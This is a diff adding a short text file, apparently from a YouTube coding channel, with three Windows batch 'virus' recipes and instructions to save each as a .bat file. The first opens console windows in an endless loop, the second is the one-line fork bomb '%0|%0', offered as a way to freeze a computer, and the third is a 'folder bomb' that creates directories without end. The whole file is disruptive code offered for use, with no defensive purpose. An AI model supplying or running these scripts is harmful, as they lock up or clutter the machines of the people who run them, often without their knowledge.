@@ -1,0 +1,58 @@
+------------------------------------
+1. Make a virus
+write down in notpad below syntex
+------------------------------------
+@echo off
+
+:loop
+
+start
+start
+start
+start
+
+goto loop 
+-----------------------------------
+save & name - in - virus.bat
+
+
+
+
+===================================
+2 how to freez computer in one line of code
+--------------------------------------------
+write down in notpad below syntex
+--------------------------------------------
+%0|%0
+-------------------------------------------
+save & name - in - virus.bat
+----------------------------=
+
+
+
+
+==============================================
+3. make a folder bomb 
+-----------------------
+write down in notpad below syntex
+----------------------------------------------
+@echo off
+
+:loop
+
+md %random%
+
+goto loop
+-------------------------------
+folder bomb.bat
+-------------------------------
+
+
+
+
+
+
+
+
+
+https://www.youtube.com/@Quiet_Coder
